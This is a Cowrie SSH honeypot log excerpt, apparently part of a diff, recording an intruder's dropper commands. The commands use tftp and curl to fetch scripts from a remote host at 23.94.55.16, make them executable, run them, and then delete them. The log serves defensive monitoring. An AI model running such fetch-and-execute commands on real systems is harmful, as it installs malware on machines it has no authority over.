+2017-06-17T00:25:59+0000 [HTTPPageDownloader,client] Command found: busybox tftp 23.94.55.16 -c get tftp1.sh
+2017-06-17T00:25:59+0000 [HTTPPageDownloader,client] Command found: tftp 23.94.55.16 -c get tftp1.sh
+2017-06-17T00:25:59+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp1.sh
+2017-06-17T00:25:59+0000 [HTTPPageDownloader,client] Command not found: ./tftp1.sh
+2017-06-17T00:25:59+0000 [HTTPPageDownloader,client] Command found: busybox tftp -r tftp2.sh -g 23.94.55.16
+2017-06-17T00:25:59+0000 [HTTPPageDownloader,client] Command found: tftp -r tftp2.sh -g 23.94.55.16
+2017-06-17T00:25:59+0000 [HTTPPageDownloader,client] Command found: chmod 777 tftp2.sh
+2017-06-17T00:25:59+0000 [HTTPPageDownloader,client] Command not found: ./tftp2.sh
+2017-06-17T00:25:59+0000 [HTTPPageDownloader,client] Command found: rm -rf /tmp/bins.sh tftp1.sh tftp2.sh rm-rf /tmp/bins.sh
+2017-06-17T00:25:59+0000 [cowrie.commands.curl.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://23.94.55.16/bins.sh>
+2017-06-17T00:25:59+0000 [SSHChannel None (239) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote eof
+2017-06-17T00:25:59+0000 [SSHChannel None (239) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote close
+2017-06-17T00:25:59+0000 [SSHChannel None (239) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] sending close 239
+2017-06-17T00:26:00+0000 [SSHChannel None (240) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote eof
+2017-06-17T00:26:00+0000 [SSHChannel None (240) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote close
+2017-06-17T00:26:00+0000 [SSHChannel None (240) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] sending close 240
